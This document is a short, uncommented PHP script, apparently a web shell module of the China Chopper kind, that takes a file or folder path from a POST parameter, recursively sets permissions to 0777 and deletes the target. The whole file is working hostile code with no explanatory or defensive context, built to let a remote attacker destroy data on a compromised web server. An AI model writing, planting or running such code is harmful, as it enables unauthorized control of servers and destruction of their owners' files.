<?php 
@ini_set("display_errors","0");@set_time_limit(0);@set_magic_quotes_runtime(0);echo("->|");;function df($p){$m=@dir($p);while(@$f=$m->read()){$pf=$p."/".$f;if((is_dir($pf))&&($f!=".")&&($f!="..")){@chmod($pf,0777);df($pf);}if(is_file($pf)){@chmod($pf,0777);@unlink($pf);}}$m->close();@chmod($p,0777);return @rmdir($p);}$F=get_magic_quotes_gpc()?stripslashes($_POST["z1"]):$_POST["z1"];if(is_dir($F))echo(df($F));else{echo(file_exists($F)?@unlink($F)?"1":"0":"0");};echo("|<-");die();

 ?>